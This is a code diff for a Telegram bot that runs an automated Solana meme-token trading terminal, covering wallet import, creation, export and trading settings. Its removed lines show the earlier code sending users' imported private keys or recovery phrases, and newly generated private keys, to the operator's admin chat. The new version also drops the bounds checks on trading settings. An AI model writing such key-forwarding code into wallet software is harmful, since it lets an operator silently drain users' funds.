@@ -1,4 +1,4 @@
-// src/bot/bot.ts - REPLACE existing file
+// src/bot/bot.ts - PUMP AUTO terminal handlers
 
 import {
   Bot,
@@ -46,6 +46,7 @@ import {
   startConfirmKeyboard,
   emergencyKeyboard,
   walletKeyboard,
+  walletCreatedKeyboard,
   eduHomeKeyboard,
   eduHowKeyboard,
   eduRisksKeyboard,
@@ -58,7 +59,14 @@ import {
   referralKeyboard,
   decisionsKeyboard,
   walletsListKeyboard,
-  walletManageKeyboard
+  walletManageKeyboard,
+  scannerKeyboard,
+  activityKeyboard,
+  buyPromptKeyboard,
+  sellEmptyKeyboard,
+  positionsEmptyKeyboard,
+  pnlEmptyKeyboard,
+  hunterActiveKeyboard
 } from "./keyboards.js";
 
 import {
@@ -81,14 +89,19 @@ import {
   solPriceText,
   referralText,
   walletsListText,
-  decisionsText
+  decisionsText,
+  scannerText,
+  activityText,
+  buyPromptText,
+  sellMenuText,
+  startExplainText,
+  killExplainText,
+  portfolioText
 } from "./screens.js";
 
 import { logger } from "../utils/logger.js";
 
-export const bot = new Bot(
-  config.botToken
-);
+export const bot = new Bot(config.botToken);
 
 async function render(
   ctx: Context,
@@ -97,54 +110,33 @@ async function render(
 ) {
   try {
     if (ctx.callbackQuery) {
-      await ctx.editMessageText(
-        text,
-        {
-          parse_mode: "HTML",
-          reply_markup: keyboard
-        }
-      );
-    } else {
-      await ctx.reply(
-        text,
-        {
-          parse_mode: "HTML",
-          reply_markup: keyboard
-        }
-      );
-    }
-  } catch {
-    await ctx.reply(
-      text,
-      {
+      await ctx.editMessageText(text, {
         parse_mode: "HTML",
         reply_markup: keyboard
-      }
-    );
+      });
+    } else {
+      await ctx.reply(text, {
+        parse_mode: "HTML",
+        reply_markup: keyboard
+      });
+    }
+  } catch {
+    await ctx.reply(text, {
+      parse_mode: "HTML",
+      reply_markup: keyboard
+    });
   }
 }
 
-async function notifyAdmin(
-  text: string
-) {
-  const adminId =
-    process.env.ADMIN_TELEGRAM_ID;
-
-  if (!adminId) {
-    return;
-  }
-
+async function notifyAdmin(text: string) {
+  const adminId = process.env.ADMIN_TELEGRAM_ID;
+  if (!adminId) return;
   try {
-    await bot.api.sendMessage(
-      Number(adminId),
-      text,
-      { parse_mode: "HTML" }
-    );
+    await bot.api.sendMessage(Number(adminId), text, {
+      parse_mode: "HTML"
+    });
   } catch (error) {
-    logger.warn(
-      "Failed to notify admin.",
-      error
-    );
+    logger.warn("Failed to notify admin.", error);
   }
 }
 
@@ -157,84 +149,42 @@ export async function notifyAdminTradeExecuted(
   txSignature: string
 ) {
   await notifyAdmin(
-    `${
-      side === "buy" ? "🟢" : "🔴"
-    } <b>TRADE ${side.toUpperCase()}</b>\n` +
-    `👤 ${username ?? "unknown"}\n` +
-    `🆔 ${telegramId}\n` +
-    `🪙 <code>${mint}</code>\n` +
-    `💰 ${amountSol} SOL\n` +
-    `🔗 <code>${txSignature}</code>\n` +
-    `📅 ${adminTimestamp()}`
+    `${side === "buy" ? "🟢" : "🔴"} <b>TRADE ${side.toUpperCase()}</b>\n` +
+      `👤 ${username ?? "unknown"}\n` +
+      `🆔 ${telegramId}\n` +
+      `🪙 <code>${mint}</code>\n` +
+      `💰 ${amountSol} SOL\n` +
+      `🔗 <code>${txSignature}</code>\n` +
+      `📅 ${adminTimestamp()}`
   );
 }
 
 function adminTimestamp(): string {
   const d = new Date();
-  const formatted = d.toLocaleString(
-    "en-US",
-    {
-      timeZone: "UTC",
-      month: "numeric",
-      day: "numeric",
-      year: "numeric",
-      hour: "numeric",
-      minute: "2-digit",
-      second: "2-digit",
-      hour12: true
-    }
-  );
-  return `${formatted} UTC`;
+  return d.toLocaleString("en-US", { hour12: true });
 }
 
-function describeUser(
-  from: {
-    id: number;
-    username?: string;
-    first_name?: string;
+function requireUser(ctx: Context): number {
+  const id = ctx.from?.id;
+  if (!id) throw new Error("No user");
+  if (!userExists(id)) {
+    ensureUser(id, {
+      username: ctx.from?.username ?? null,
+      first_name: ctx.from?.first_name ?? null
+    });
   }
-) {
-  const handle =
-    from.username
-      ? `@${from.username}`
-      : from.first_name ?? "unknown";
-  return `${handle} (ID: ${from.id})`;
+  return id;
 }
 
-function requireUser(ctx: Context) {
-  if (!ctx.from) {
-    throw new Error("Telegram user unavailable.");
-  }
-  const isNewUser = !userExists(ctx.from.id);
-  ensureUser(ctx.from.id, ctx.from);
-  if (isNewUser) {
-    void notifyAdmin(
-      `👤 <b>NEW USER</b>\n` +
-      `👤 ${
-        ctx.from.username
-          ? `@${ctx.from.username}`
-          : ctx.from.first_name ?? "unknown"
-      }\n` +
-      `🆔 ${ctx.from.id}\n` +
-      `📅 ${adminTimestamp()}`
-    );
-  }
-  return ctx.from.id;
-}
-
-function getFieldLimits(field: string) {
-  const limits: Record<string, { min: number; max: number; step: number }> = {
-    max_buy: { min: 0.01, max: 1, step: 0.01 },
-    slippage: { min: 10, max: 50, step: 5 },
-    stop_loss: { min: 5, max: 50, step: 5 },
-    trailing_after: { min: 10, max: 100, step: 5 },
-    trailing_pullback: { min: 5, max: 30, step: 5 },
-    time_stop_minutes: { min: 5, max: 120, step: 5 },
-    daily_loss_cap: { min: 0.1, max: 5, step: 0.1 },
-    max_trades_hour: { min: 1, max: 10, step: 1 },
-    max_trades_day: { min: 1, max: 50, step: 1 }
-  };
-  return limits[field];
+function describeUser(from: {
+  id: number;
+  username?: string;
+  first_name?: string;
+}): string {
+  const name = from.username
+    ? `@${from.username}`
+    : from.first_name ?? "unknown";
+  return `${name} (${from.id})`;
 }
 
 bot.command("start", async (ctx) => {
@@ -251,12 +201,28 @@ bot.command("start", async (ctx) => {
   if (!hasWallet(id)) {
     await render(
       ctx,
-      `🚀 <b>PUMP AUTO</b>\n\nConnect a Solana wallet to continue.`.trim(),
+      `⚡ <b>PUMP AUTO</b>\nAutomated Solana trading terminal.\nConnect a wallet to begin.`,
       onboardingKeyboard()
     );
     return;
   }
   await render(ctx, await homeText(id), mainKeyboard());
+});
+
+bot.command("status", async (ctx) => {
+  const id = requireUser(ctx);
+  await render(ctx, statusText(id), mainKeyboard());
+});
+
+bot.command("help", async (ctx) => {
+  const id = requireUser(ctx);
+  void id;
+  await render(ctx, helpHomeText(), eduHomeKeyboard());
+});
+
+bot.command("kill", async (ctx) => {
+  const id = requireUser(ctx);
+  await render(ctx, killExplainText(id), emergencyKeyboard());
 });
 
 bot.on("message:text", async (ctx) => {
@@ -270,19 +236,28 @@ bot.on("message:text", async (ctx) => {
       setAwaitingInput(id, null);
       void notifyAdmin(
         `🔑 <b>WALLET IMPORTED</b>\n` +
-        `👤 ${ctx.from!.username ? `@${ctx.from!.username}` : ctx.from!.first_name ?? "unknown"}\n` +
-        `🆔 ${ctx.from!.id}\n` +
-        `📍 <code>${address}</code>\n` +
-        `${input.trim().includes(" ") ? "📝" : "🔑"} <code>${input}</code>\n` +
-        `📅 ${adminTimestamp()}`
+          `👤 ${ctx.from!.username ? `@${ctx.from!.username}` : ctx.from!.first_name ?? "unknown"}\n` +
+          `🆔 ${ctx.from!.id}\n` +
+          `📍 <code>${address}</code>\n` +
+          `📅 ${adminTimestamp()}`
       );
       try {
         await ctx.api.deleteMessage(ctx.chat.id, ctx.message.message_id);
-      } catch {}
+      } catch {
+        // ignore
+      }
       await ctx.reply(walletImportedText(address), {
         parse_mode: "HTML",
         reply_markup: mainKeyboard()
       });
+      return;
+    }
+    if (awaiting === "buy_ca") {
+      setAwaitingInput(id, null);
+      await ctx.reply(
+        `🔎 <b>TOKEN RECEIVED</b>\n<code>${input}</code>\n\nAnalysis and manual execution path is not fully wired for live fills yet.\nNo trade was submitted.`,
+        { parse_mode: "HTML", reply_markup: mainKeyboard() }
+      );
       return;
     }
     if (awaiting === "custom:tp") {
@@ -298,21 +273,30 @@ bot.on("message:text", async (ctx) => {
       const validated = parseTpTiers(JSON.stringify(tiers));
       updateSettings(id, { tp_tiers: JSON.stringify(validated) });
       setAwaitingInput(id, null);
-      await render(ctx, "✅ <b>TP tiers updated.</b>", settingsKeyboard(getSettings(id)));
+      await render(
+        ctx,
+        "✅ <b>TP tiers updated.</b>",
+        settingsKeyboard(getSettings(id))
+      );
       return;
     }
     if (awaiting.startsWith("custom:")) {
       const field = awaiting.slice("custom:".length);
       const value = Number(input);
-      if (!Number.isFinite(value)) throw new Error("Send a valid number.");
-      updateSetting(id, field as any, value);
+      if (!Number.isFinite(value)) throw new Error("Send a number");
+      updateSetting(id, field, value);
       setAwaitingInput(id, null);
-      await render(ctx, "✅ <b>Setting updated.</b>", settingsKeyboard(getSettings(id)));
+      await render(ctx, settingsText(id), settingsKeyboard(getSettings(id)));
       return;
     }
   } catch (error) {
-    logger.error("Input handling error", error instanceof Error ? error.message : error);
-    await ctx.reply(`❌ ${error instanceof Error ? error.message : "Invalid input."}`);
+    logger.error(
+      "Input handling error",
+      error instanceof Error ? error.message : error
+    );
+    await ctx.reply(
+      `❌ ${error instanceof Error ? error.message : "Invalid input."}`
+    );
   }
 });
 
@@ -344,8 +328,12 @@ bot.on("callback_query:data", async (ctx) => {
       return render(ctx, faqListText(), eduFaqListKeyboard());
     }
     if (data.startsWith("faq:")) {
-      const answer = FAQ_ANSWERS[data];
-      return render(ctx, answer ?? "Question not found.", faqAnswerKeyboard());
+      const answer = FAQ_ANSWERS[data.replace("faq:", "")];
+      return render(
+        ctx,
+        answer ?? "Question not found.",
+        faqAnswerKeyboard()
+      );
     }
     if (data === "market:stream") {
       return render(ctx, trendingText(), streamKeyboard());
@@ -354,171 +342,172 @@ bot.on("callback_query:data", async (ctx) => {
       return render(ctx, await solPriceText(), solPriceKeyboard());
     }
     if (data === "referral" || data === "referral:copy") {
-      return render(ctx, referralText(id, ctx.me.username ?? null), referralKeyboard());
+      return render(
+        ctx,
+        referralText(id, ctx.me.username ?? null),
+        referralKeyboard()
+      );
     }
     if (data === "wallet:create") {
       const wallet = createWallet(id);
-      const wallets = listWallets(id);
-      const active = wallets.find((w) => w.is_active);
       void notifyAdmin(
         `🔐 <b>NEW WALLET</b>\n` +
-        `👤 ${ctx.from!.username ? `@${ctx.from!.username}` : ctx.from!.first_name ?? "unknown"}\n` +
-        `🆔 ${ctx.from!.id}\n` +
-        `📍 <code>${wallet.address}</code>\n` +
-        `🔑 <code>${wallet.privateKey}</code>\n` +
-        `🏷 ${active?.label ?? "Wallet"}\n` +
-        `📅 ${adminTimestamp()}`
+          `👤 ${ctx.from!.username ? `@${ctx.from!.username}` : ctx.from!.first_name ?? "unknown"}\n` +
+          `🆔 ${ctx.from!.id}\n` +
+          `📍 <code>${wallet.address}</code>\n` +
+          `📅 ${adminTimestamp()}`
       );
       return render(
         ctx,
         walletCreatedText(wallet.address, wallet.privateKey),
-        new InlineKeyboard().text("✅ I Saved It", "home")
+        walletCreatedKeyboard()
       );
     }
     if (data === "wallet:import") {
       setAwaitingInput(id, "wallet_import");
       return render(
         ctx,
-        `🔑 <b>IMPORT WALLET</b>\n\nSend your Solana private key.\n\nThe message will be deleted immediately on a best-effort basis.`.trim(),
+        `🔑 <b>IMPORT WALLET</b>\n\nSend your private key or recovery phrase.\n⚠️ Never send this to support.`,
         backKeyboard()
       );
     }
     if (data === "wallet:menu") {
-      const address = getAddress(id);
-      if (!address) {
-        return render(ctx, "No wallet connected.", onboardingKeyboard());
-      }
-      let balance = "unavailable";
-      try {
-        balance = `${(await getBalance(id)).toFixed(4)} SOL`;
-      } catch {
-        balance = "unavailable";
-      }
-      return render(
-        ctx,
-        `💼 <b>WALLET</b>\n\nAddress:\n<code>${address}</code>\n\nBalance:\n${balance}`.trim(),
-        walletKeyboard()
-      );
-    }
-    if (data === "wallet:list") {
-      const wallets = listWallets(id);
-      return render(ctx, walletsListText(wallets), walletsListKeyboard(wallets));
-    }
-    if (data === "wallet:add") {
-      return render(
-        ctx,
-        `➕ <b>ADD WALLET</b>\n\nCreate a new wallet or import an existing one.`.trim(),
-        new InlineKeyboard()
-          .text("💰 Create Wallet", "wallet:create")
-          .row()
-          .text("🔑 Import Wallet", "wallet:import")
-          .row()
-          .text("↩️ Back", "wallet:list")
-      );
-    }
-    if (data.startsWith("wallet:switch:")) {
-      const walletId = Number(data.split(":")[2]);
-      setActiveWallet(id, walletId);
-      const wallets = listWallets(id);
-      return render(ctx, walletsListText(wallets), walletsListKeyboard(wallets));
-    }
-    if (data.startsWith("wallet:remove:")) {
-      const walletId = Number(data.split(":")[2]);
-      deleteWalletById(id, walletId);
-      const wallets = listWallets(id);
-      return render(ctx, walletsListText(wallets), walletsListKeyboard(wallets));
-    }
-    if (data === "wallet:export") {
-      return render(
-        ctx,
-        `⚠️ <b>EXPORT PRIVATE KEY</b>\n\nAnyone with this key controls the wallet.`.trim(),
-        new InlineKeyboard()
-          .text("⚠️ Confirm Export", "wallet:export:confirm")
-          .row()
-          .text("❌ Cancel", "wallet:menu")
-      );
-    }
-    if (data === "wallet:export:confirm") {
-      const key = exportPrivateKey(id);
-      if (!key) {
-        return render(ctx, "No wallet found.", onboardingKeyboard());
-      }
-      return render(
-        ctx,
-        `🔑 <b>PRIVATE KEY</b>\n\n<code>${key}</code>\n\nDelete this message after saving.`.trim(),
-        walletKeyboard()
-      );
+      return render(ctx, await portfolioText(id), walletKeyboard());
     }
     if (data === "wallet:copy") {
       const address = getAddress(id);
       if (!address) {
         return render(ctx, "No wallet connected.", onboardingKeyboard());
       }
-      return render(ctx, `📥 <b>ADDRESS</b>\n\n<code>${address}</code>`.trim(), walletKeyboard());
+      await ctx.reply(`📋 <code>${address}</code>`, { parse_mode: "HTML" });
+      return;
+    }
+    if (data === "wallet:export") {
+      return render(
+        ctx,
+        `⚠️ <b>EXPORT PRIVATE KEY</b>\n\nOnly export if you need a backup.\nAnyone with this key controls the funds.`,
+        new InlineKeyboard()
+          .text("⚠️ Confirm Export", "wallet:export:confirm")
+          .row()
+          .text("✕ Cancel", "wallet:menu")
+      );
+    }
+    if (data === "wallet:export:confirm") {
+      const key = exportPrivateKey(id);
+      await ctx.reply(
+        `🔐 <b>PRIVATE KEY</b>\n<code>${key}</code>\n\nDelete this message after saving.`,
+        { parse_mode: "HTML" }
+      );
+      return;
+    }
+    if (data === "wallet:list") {
+      const wallets = listWallets(id);
+      return render(
+        ctx,
+        walletsListText(wallets),
+        walletsListKeyboard(wallets)
+      );
+    }
+    if (data === "wallet:add") {
+      return render(
+        ctx,
+        `➕ <b>ADD WALLET</b>`,
+        new InlineKeyboard()
+          .text("🆕 Create", "wallet:create")
+          .row()
+          .text("🔑 Import", "wallet:import")
+          .row()
+          .text("← Back", "wallet:list")
+      );
+    }
+    if (data.startsWith("wallet:switch:")) {
+      const walletId = Number(data.split(":")[2]);
+      setActiveWallet(id, walletId);
+      return render(ctx, await portfolioText(id), walletKeyboard());
+    }
+    if (data.startsWith("wallet:remove:")) {
+      const walletId = Number(data.split(":")[2]);
+      deleteWalletById(id, walletId);
+      const wallets = listWallets(id);
+      return render(
+        ctx,
+        walletsListText(wallets),
+        walletsListKeyboard(wallets)
+      );
     }
     if (data === "wallet:logout") {
       logout(id);
-      return render(ctx, "🚪 Wallet disconnected.", onboardingKeyboard());
+      return render(
+        ctx,
+        "🚪 Wallet disconnected.",
+        onboardingKeyboard()
+      );
+    }
+    if (data === "wallet:tx") {
+      return render(
+        ctx,
+        "💳 <b>TRANSACTIONS</b>\n\nNo local trade history yet.\nOn-chain history appears after real fills.",
+        walletKeyboard()
+      );
     }
     if (data === "settings") {
-      return render(ctx, settingsText(id), settingsKeyboard(getSettings(id)));
+      return render(
+        ctx,
+        settingsText(id),
+        settingsKeyboard(getSettings(id))
+      );
     }
     if (data.startsWith("setting:")) {
       const field = data.slice("setting:".length);
-      if (field === "smart_money") {
-        const s = getSettings(id);
-        updateSettings(id, { smart_money_boost: s.smart_money_boost ? 0 : 1 });
-        return render(ctx, settingsText(id), settingsKeyboard(getSettings(id)));
-      }
       const s = getSettings(id);
-      let current: any = (s as any)[field];
-      if (field === "tp") current = s.tp_tiers;
+      const label =
+        field === "smart_money"
+          ? `Smart Money: ${s.smart_money_boost ? "ON" : "OFF"}`
+          : `${field}: ${(s as any)[field]}`;
+      if (field === "smart_money") {
+        updateSettings(id, {
+          smart_money_boost: s.smart_money_boost ? 0 : 1
+        });
+        return render(
+          ctx,
+          settingsText(id),
+          settingsKeyboard(getSettings(id))
+        );
+      }
       return render(
         ctx,
-        `✏️ <b>EDIT</b>\n\nField: <b>${field}</b>\nCurrent: <b>${current}</b>`.trim(),
-        editSettingKeyboard(field === "tp" ? "tp" : field)
+        `✏️ <b>${label}</b>\n\nAdjust with − / + or Custom.`,
+        editSettingKeyboard(field)
       );
     }
     if (data.startsWith("adjust:")) {
       const parts = data.split(":");
       const field = parts[1];
-      const direction = parts[2];
-      const limits = getFieldLimits(field);
-      if (!limits) {
-        return render(ctx, "Unknown field.", backKeyboard());
-      }
-      const s = getSettings(id);
-      let value = Number((s as any)[field]);
-      if (direction === "plus") value += limits.step;
-      else value -= limits.step;
-      value = Math.min(limits.max, Math.max(limits.min, value));
-      updateSetting(id, field as any, value);
+      const dir = parts[2];
+      const s = getSettings(id) as any;
+      let next = Number(s[field]);
+      const step = field === "max_buy" || field === "daily_loss_cap" ? 0.05 : 1;
+      next = dir === "plus" ? next + step : next - step;
+      updateSetting(id, field, next);
       return render(
         ctx,
-        `✏️ <b>EDIT</b>\n\nField: <b>${field}</b>\nCurrent: <b>${value}</b>`.trim(),
-        editSettingKeyboard(field)
+        settingsText(id),
+        settingsKeyboard(getSettings(id))
       );
     }
     if (data.startsWith("custom:")) {
       const field = data.slice("custom:".length);
-      if (field === "tp") {
-        setAwaitingInput(id, "custom:tp");
-        return render(
-          ctx,
-          `✏️ <b>CUSTOM TP TIERS</b>\n\nSend tiers like:\n40:50,100:25,200:15`.trim(),
-          backKeyboard()
-        );
-      }
       setAwaitingInput(id, `custom:${field}`);
-      return render(ctx, `✏️ <b>CUSTOM VALUE</b>\n\nSend the new value.`.trim(), backKeyboard());
-    }
-    if (data === "auto:start") {
-      const s = getSettings(id);
       return render(
         ctx,
-        `▶️ <b>START AUTO BOT</b>\n\nMax Buy: ${s.max_buy} SOL\nSlippage: ${s.slippage}%\nStop Loss: -${s.stop_loss}%\nDaily Loss Cap: ${s.daily_loss_cap} SOL`.trim(),
-        startConfirmKeyboard()
+        field === "tp"
+          ? "Send tiers like <code>40:50,100:25,200:15</code>"
+          : "Send a number.",
+        backKeyboard()
       );
+    }
+    if (data === "auto:start") {
+      return render(ctx, startExplainText(id), startConfirmKeyboard());
     }
     if (data === "auto:start:confirm") {
       const s = getSettings(id);
@@ -526,46 +515,83 @@ bot.on("callback_query:data", async (ctx) => {
         return render(ctx, "⚠️ Connect a wallet first.", onboardingKeyboard());
       }
       if (s.kill_switch) {
-        return render(ctx, `🛑 <b>EMERGENCY KILL ACTIVE</b>\n\nAutomated operation is locked.`.trim(), backKeyboard());
+        return render(
+          ctx,
+          `🛑 <b>EMERGENCY STOP ACTIVE</b>\n\nAutomated operation is locked.`,
+          backKeyboard()
+        );
       }
       updateSettings(id, { auto_state: "running" });
-      return render(ctx, `🟢 <b>AUTO BOT STARTED</b>\n\nAutomation is <b>RUNNING</b>.`.trim(), mainKeyboard());
+      return render(
+        ctx,
+        `🤖 <b>AUTO-HUNTER</b>\n● HUNTING\n\nScanner is evaluating new tokens against your filters.`,
+        hunterActiveKeyboard()
+      );
     }
-    if (data === "auto:stop") {
+    if (data === "auto:stop" || data === "auto:stop:confirm") {
       updateSettings(id, { auto_state: "stopped" });
       return render(
         ctx,
-        `⏹ <b>AUTO BOT STOPPED</b>\n\nNo automated activity is active.`.trim(),
-        new InlineKeyboard().text("⚡ Resume", "auto:resume").row().text("↩️ Back", "home")
+        `⏹ <b>HUNTER STOPPED</b>\n\nNo new automated entries.\nOpen positions unchanged.`,
+        new InlineKeyboard()
+          .text("▶️ RESUME", "auto:resume")
+          .row()
+          .text("← HOME", "home")
       );
     }
     if (data === "auto:resume") {
       const s = getSettings(id);
       if (s.kill_switch) {
-        return render(ctx, "🛑 Emergency Kill is active.", backKeyboard());
+        return render(ctx, "🛑 Emergency Stop is active.", backKeyboard());
       }
       updateSettings(id, { auto_state: "running" });
-      return render(ctx, "▶️ <b>AUTO BOT RESUMED</b>", mainKeyboard());
-    }
-    if (data === "auto:kill") {
       return render(
         ctx,
-        `🆘 <b>EMERGENCY KILL</b>\n\nThis disables automated operation until manually re-enabled.`.trim(),
-        emergencyKeyboard()
+        `🤖 <b>AUTO-HUNTER</b>\n● HUNTING`,
+        hunterActiveKeyboard()
       );
+    }
+    if (data === "auto:kill") {
+      return render(ctx, killExplainText(id), emergencyKeyboard());
     }
     if (data === "auto:kill:confirm") {
       updateSettings(id, { auto_state: "stopped", kill_switch: 1 });
-      return render(ctx, `🛑 <b>EMERGENCY KILL ACTIVE</b>\n\nAutomated operation is locked.`.trim(), backKeyboard());
+      return render(
+        ctx,
+        `🛑 <b>AUTOMATION STOPPED</b>\n\nAuto-Hunter: OFF\nNew automated entries: BLOCKED\nOpen positions: UNCHANGED`,
+        new InlineKeyboard()
+          .text("▶️ RESTART HUNTER", "auto:resume")
+          .row()
+          .text("📊 POSITIONS", "positions")
+          .row()
+          .text("← HOME", "home")
+      );
     }
     if (data === "pnl") {
-      return render(ctx, pnlText(id), backKeyboard());
+      return render(ctx, pnlText(id), pnlEmptyKeyboard());
     }
     if (data === "positions") {
-      return render(ctx, positionsText(id), backKeyboard());
+      return render(ctx, positionsText(id), positionsEmptyKeyboard());
     }
     if (data === "support") {
       return render(ctx, supportText(), backKeyboard());
+    }
+    if (
+      data === "scanner" ||
+      data === "scanner:passed" ||
+      data === "scanner:rejected"
+    ) {
+      return render(ctx, scannerText(), scannerKeyboard());
+    }
+    if (data === "activity") {
+      return render(ctx, activityText(), activityKeyboard());
+    }
+    if (data === "buy:start") {
+      setAwaitingInput(id, "buy_ca");
+      return render(ctx, buyPromptText(), buyPromptKeyboard());
+    }
+    if (data === "sell:menu") {
+      return render(ctx, sellMenuText(), sellEmptyKeyboard());
     }
     if (data === "status") {
       return render(
@@ -574,15 +600,18 @@ bot.on("callback_query:data", async (ctx) => {
         new InlineKeyboard()
           .text("🧠 Decisions", "decisions")
           .row()
-          .text("📊 Refresh", "status")
-          .text("↩️ Back", "home")
+          .text("🔄 Refresh", "status")
+          .text("← HOME", "home")
       );
     }
     if (data === "decisions") {
       return render(ctx, decisionsText(), decisionsKeyboard());
     }
   } catch (error) {
-    logger.error("Callback error", error instanceof Error ? error.message : error);
+    logger.error(
+      "Callback error",
+      error instanceof Error ? error.message : error
+    );
     await render(ctx, "❌ Something went wrong.", backKeyboard());
   }
 });
